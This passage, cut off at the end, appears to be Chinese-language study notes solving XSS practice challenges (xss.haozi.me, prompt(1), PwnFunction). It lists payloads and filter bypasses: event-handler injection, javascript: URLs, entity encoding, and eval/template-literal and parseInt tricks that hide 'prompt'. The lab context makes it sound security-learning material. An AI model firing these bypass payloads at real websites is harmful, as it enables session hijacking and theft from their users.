class=\"number\">1</span>)&#125;bbb<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//不弹</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//弹窗</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">alert</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//如果aaaa全局有定义返回变量对应的值，没有定义则not define 报错</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;aaaa&#x27;)</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//返回[&quot;aaaaaaaaa&quot;]</span></span><br><span class=\"line\"><span class=\"string\">eval([&quot;aaaaaaaaa&quot;]);</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval只能接收第一个参数的值，他只有一个参数</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//`</span><span class=\"string\">`两端字符串依然为空，但中间是一个字符串不是函数，此时第二个参数为&#x27;prompt(1)&#x27;,但eval不接</span></span><br><span class=\"line\"><span class=\"string\">eval`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">[&#x27;&#x27;, &#x27;&#x27;, raw: Array(2)]</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入11111,打印11111.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象window中有prompt函数，执行eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">eval(&#x27;prompt(1)&#x27;)</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"string\">&#x27;prompt(1)&#x27;</span>&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">&#x27;11111&#x27;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//输入aaaa,打印aaaa undefined.&#123;&#125;首先执行，返回([&quot;&quot;,&quot;&quot;],&#x27;prompt(1)&#x27;),此时数组为空，即第一个参数为空，那么call指向全局对象，全局对象没有aaaa方法，返回undefined,但注意如果输入为数字那么原样返回</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span>$&#123;<span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)&#125;<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">Uncaught ReferenceError: aaaa is not defined</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">//eval别名调用，指向全局变量，因为js不允许指向prompt.第二个参数没传值，因此返回undefined</span></span><br><span class=\"line\"><span class=\"string\">eval.call`</span><span class=\"title function_\">prompt</span>(<span class=\"number\">1</span>)<span class=\"string\">`</span></span><br><span class=\"line\"><span class=\"string\">undefined</span></span><br></pre></td></tr></table></figure>\n<p>模板字符串中需要有表达式 ${} 才能执行  <code>eval</code></p>\n<p>eval () 是个函数，会将传入的字符串当做代码执行，如果全局没有该字符串变量，会报错 undefined，如果传入的不是字符串，eval 会将参数直接返回</p>\n<p>alert 有 tostring 方法，将数字专为字符串执行</p>\n<p>eval 没有 tostring，将数字放入数组中</p>\n<p>模板字符串可以解析 16 进制和 Unicode</p>\n<p>call 用来改变 this 指向</p>\n<h2 id=\"httpsxsshaozime\"><a class=\"markdownIt-Anchor\" href=\"#httpsxsshaozime\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly94c3MuaGFvemkubWUv\">https://xss.haozi.me/</span></h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDA3NzU0NC9hcnRpY2xlL2RldGFpbHMvOTUwOTQ3NTk=\">https://blog.csdn.net/weixin_44077544/article/details/95094759</span></p>\n<p>0x03</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;a href=&quot;javascript:alert&amp;#40;1&amp;#41;&quot;&gt;aaa</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;alert`1`&quot;&gt;</span><br></pre></td></tr></table></figure>\n<p>0x05</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">--!&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;--!</span><br></pre></td></tr></table></figure>\n<p>0x06</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">onclick</span><br><span class=\"line\">=alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">type=&quot;image&quot; src=1 onerror=</span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x07</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=&#x27;1&#x27; onerror=&#x27;alert(1)&#x27;//</span><br></pre></td></tr></table></figure>\n<p>0x08</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;/style</span><br><span class=\"line\">&gt;</span><br><span class=\"line\">&lt;script&gt;alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x09</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;script src=https://www/segmentfault.com&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x0A</p>\n<p>只有 Firefox 可以进行跳转</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.segmentfault.com@xss.haozi.com/j.js</span><br></pre></td></tr></table></figure>\n<p>http/https @ 会匹配后面一个并进行重定向</p>\n<p>ftp @前是用户名，后是 password</p>\n<p>0x0B</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;img src=1 onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\">&lt;svg/onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;(1)&quot;&gt;</span><br><span class=\"line\">&lt;scripscriptt src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/scripscriptt&gt;</span><br><span class=\"line\">&lt;cript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/cript&gt;</span><br></pre></td></tr></table></figure>\n<p>0x0C</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">同0x0B</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0D</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">111</span><br><span class=\"line\">alert(1)</span><br><span class=\"line\">--&gt; </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20220912152740785.png\" alt=\"image-20220912152740785\"></p>\n<p>0x0E</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ſ用在有转大写时</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;ſcript src=&quot;https://xss.haozi.me/j.js&quot;&gt;&lt;/ſcript&gt;</span><br><span class=\"line\">&lt;ſvg onload=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>0x0F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27;);alert(1)//</span><br></pre></td></tr></table></figure>\n<p>0x10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">执行 `中的代码,es6模板字符串</span><br><span class=\"line\"></span><br><span class=\"line\">alert(1)</span><br></pre></td></tr></table></figure>\n<p>0x11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;?;alert(1)/.</span><br></pre></td></tr></table></figure>\n<h2 id=\"prompt1\"><a class=\"markdownIt-Anchor\" href=\"#prompt1\">#</a> prompt(1)</h2>\n<p>2</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">eval.call</span><br><span class=\"line\">prompt`1`</span><br><span class=\"line\">&lt;svg&gt;&lt;script&gt;prompt&amp;#40;1)   切换命名空间</span><br><span class=\"line\">最好不要编码符号</span><br></pre></td></tr></table></figure>\n<p>5</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">aaa&quot; onerror</span><br><span class=\"line\">=&quot;prompt(1)&quot; src=111 type=&quot;image </span><br></pre></td></tr></table></figure>\n<p>6</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form&gt;中注入</span><br><span class=\"line\">// e.g. http://httpbin.org/post#&#123;&quot;name&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;http://httpbin.org/post&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;name&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;</span><br><span class=\"line\">javascript:prompt(1)#&#123;&quot;action&quot;:&quot;Matt&quot;&#125;</span><br><span class=\"line\">&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;Matt&quot;&gt;&lt;/form&gt;     </span><br><span class=\"line\">通过input action覆盖form action</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;script&gt;                                                  \\n\\</span><br><span class=\"line\">    // forbid javascript: or vbscript: and data: stuff    \\n\\</span><br><span class=\"line\">    if (!/script:|data:/i.test(document.forms[0].action)) \\n\\</span><br><span class=\"line\">        document.forms[0].submit();                       \\n\\</span><br><span class=\"line\">    else                                                  \\n\\</span><br><span class=\"line\">        document.write(&quot;Action forbidden.&quot;)               \\n\\</span><br><span class=\"line\">&lt;/script&gt;   </span><br></pre></td></tr></table></figure>\n<p>7</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;&gt;&lt;script&gt;/*#*/prompt/*#*/(1)/*#*/&lt;/script&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;&quot;&gt;&lt;script&gt;/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/prompt/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/(1)/*&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\">&lt;p class=&quot;comment&quot; title=&quot;*/&lt;/script&gt;&quot;&gt;&lt;/p&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>8</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">U+005C:反斜杠(reverse solidus)</span><br><span class=\"line\">U+000D:回车 (carriage return)</span><br><span class=\"line\">U+2028:行分隔符(line separator)</span><br><span class=\"line\">U+2029∶段分隔符(paragraph separator)</span><br><span class=\"line\">u+000A:换行符（line feed)</span><br><span class=\"line\">&#x27;\\u2028prompt(1)\\u2028--&gt;&#x27;</span><br></pre></td></tr></table></figure>\n<p>10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">prom&#x27;pt(1)</span><br></pre></td></tr></table></figure>\n<p>11</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure>\n<p>12</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">parseInt  转为x进制数的十进制数,x范围为2-36</span><br><span class=\"line\">36 = [a-z] + [0-9]</span><br><span class=\"line\">如果第一个字符不能转为进制返回nan</span><br><span class=\"line\">p = 10+16</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">进制数必须大于30，必须要大于t的进制数 t = 10 + 20</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,25)</span><br><span class=\"line\">NaN</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,26)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,27)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;p&#x27;,36)</span><br><span class=\"line\">25</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,29)</span><br><span class=\"line\">18361375</span><br><span class=\"line\">parseInt(&#x27;prompt&#x27;,30)</span><br><span class=\"line\">630038579</span><br><span class=\"line\">18361375..toString(29)</span><br><span class=\"line\">&#x27;promp&#x27;</span><br><span class=\"line\">630038579..toString(30)</span><br><span class=\"line\">&#x27;prompt&#x27;</span><br><span class=\"line\">r是28进制数，如果27仍是p的结果</span><br><span class=\"line\"></span><br><span class=\"line\">eval(630038579..toString(30))(1)</span><br><span class=\"line\"></span><br><span class=\"line\">eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a = eval(&#x27;prompt&#x27;)</span><br><span class=\"line\">ƒ prompt() &#123; [native code] &#125;</span><br><span class=\"line\">a(1)</span><br><span class=\"line\">&#x27;&#x27;</span><br></pre></td></tr></table></figure>\n<p>F</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svg命名空间中使用xml语法，且xml注释和html注释一样</span><br><span class=\"line\">&quot;&gt;&lt;svg&gt;....</span><br><span class=\"line\">如果不进行命名空间切换，script无法识别html注释</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>写在最前：</p>\n<p>做 pwnfunction 时时刻注意：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.</span><br><span class=\"line\">name = &quot;&lt;script&gt;alert(&#x27;I am John in an annoying alert!&#x27;)&lt;/script&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // harmless in this case</span><br><span class=\"line\">这种看似xss的方式是行不通的</span><br><span class=\"line\">HTML 5 中指定不执行由 innerHTML 插入的 &lt;script&gt; 标签。</span><br><span class=\"line\">然而，有很多不依赖 &lt;script&gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：</span><br><span class=\"line\">const name = &quot;&lt;img src=&#x27;x&#x27; onerror=&#x27;alert(1)&#x27;&gt;&quot;;</span><br><span class=\"line\">el.innerHTML = name; // shows the alert</span><br><span class=\"line\">Copy to Clipboard</span><br><span class=\"line\">基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。</span><br><span class=\"line\"></span><br><span class=\"line\">2.</span><br><span class=\"line\"> 如果一个 &lt;div&gt;, &lt;span&gt;, 或 &lt;noembed&gt; 节点有一个文本子节点，该节点包含字符 (&amp;), (&lt;), 或 (&gt;), innerHTML 将这些字符分别返回为 &amp;amp;, &amp;lt; 和 &amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。</span><br></pre></td></tr></table></figure>\n<h2 id=\"ma-spaghet\"><a class=\"markdownIt-Anchor\" href=\"#ma-spaghet\">#</a> Ma Spaghet</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">somebody = &lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class=\"line\">尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&lt;script&gt;标签。</span><br><span class=\"line\">然而，有很多不依赖&lt;script&gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&lt;img&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;h2 id=&quot;spaghet&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    spaghet.innerHTML = (new URL(location).searchParams.get(&#x27;somebody&#x27;) || &quot;Somebody&quot;) + &quot; Toucha Ma Spaghet!&quot;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;svg onload=alert(1337)&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"jefff\"><a class=\"markdownIt-Anchor\" href=\"#jefff\">#</a> Jefff</h2>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==\">eval() - JavaScript | MDN (mozilla.org)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=\">function.md - wangdoc/javascript-tutorial - Sourcegraph</span></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;maname&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let jeff = (new URL(location).searchParams.get(&#x27;jeff&#x27;) || &quot;JEFFF&quot;)</span><br><span class=\"line\">    let ma = &quot;&quot;</span><br><span class=\"line\">    eval(`ma = &quot;Ma name $&#123;jeff&#125;&quot;`)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        maname.innerText = ma</span><br><span class=\"line\">    &#125;, 1000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],prompt(1))</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">eval([&quot;&quot;,&quot;&quot;],&#x27;aaaaa&#x27;)</span><br><span class=\"line\">(2) [&#x27;&#x27;, &#x27;&#x27;]</span><br><span class=\"line\">//eval没有tostring方法，会返回数组形式的第一个参数</span><br><span class=\"line\">如果eval的参数不是字符串，那么会原样返回。</span><br><span class=\"line\"></span><br><span class=\"line\">1&quot;;alert(1)//</span><br><span class=\"line\">1&quot;,alert(1)//</span><br><span class=\"line\">jeff=&quot;-alert(1)-&quot;</span><br><span class=\"line\">在js中-两边都是表达式，则可以执行代码</span><br><span class=\"line\">先闭合Ma name 1&quot; 再用,或者;分割作为eval第二个参数，实现上面那个例子的弹窗</span><br></pre></td></tr></table></figure>\n<h2 id=\"da-wey\"><a class=\"markdownIt-Anchor\" href=\"#da-wey\">#</a> da-wey</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;div id=&quot;uganda&quot;&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    let wey = (new URL(location).searchParams.get(&#x27;wey&#x27;) || &quot;do you know da wey?&quot;);</span><br><span class=\"line\">    wey = wey.replace(/[&lt;&gt;]/g, &#x27;&#x27;)</span><br><span class=\"line\">    uganda.innerHTML = `&lt;input type=&quot;text&quot; placeholder=&quot;$&#123;wey&#125;&quot; class=&quot;form-control&quot;&gt;`</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">?wey=1&quot; onfocus=alert(1) autofocus//</span><br></pre></td></tr></table></figure>\n<h2 id=\"ricardo\"><a class=\"markdownIt-Anchor\" href=\"#ricardo\">#</a> ricardo</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    ricardo.action = (new URL(location).searchParams.get(&#x27;ricardo&#x27;) || &#x27;#&#x27;)</span><br><span class=\"line\">    setTimeout(_ =&gt; &#123;</span><br><span class=\"line\">        ricardo.submit()</span><br><span class=\"line\">    &#125;, 2000)</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">ricardo=javascript:alert(1)</span><br><span class=\"line\"></span><br><span class=\"line\">效果类似于这样:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;form id=&quot;ricardo&quot; method=&quot;GET&quot; action=&quot;javascript:alert(1)&quot;&gt;</span><br><span class=\"line\">    &lt;input name=&quot;milos&quot; type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;True&quot; value=&quot;True&quot;&gt;</span><br><span class=\"line\">    &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"ah-thats-hawt\"><a class=\"markdownIt-Anchor\" href=\"#ah-thats-hawt\">#</a> Ah That’s Hawt</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;h2 id=&quot;will&quot;&gt;&lt;/h2&gt;</span><br><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">    smith = (new URL(location).searchParams.get(&#x27;markassbrownlee&#x27;) || &quot;Ah That&#x27;s Hawt&quot;)</span><br><span class=\"line\">    smith = smith.replace(/[\\(\\`\\)\\\\]/g, &#x27;&#x27;)</span><br><span class=\"line\">    will.innerHTML = smith</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">过滤了()`\\  </span><br><span class=\"line\">先html实体，在url编码</span><br><span class=\"line\">或者两次url编码</span><br><span class=\"line\">payload:</span><br><span 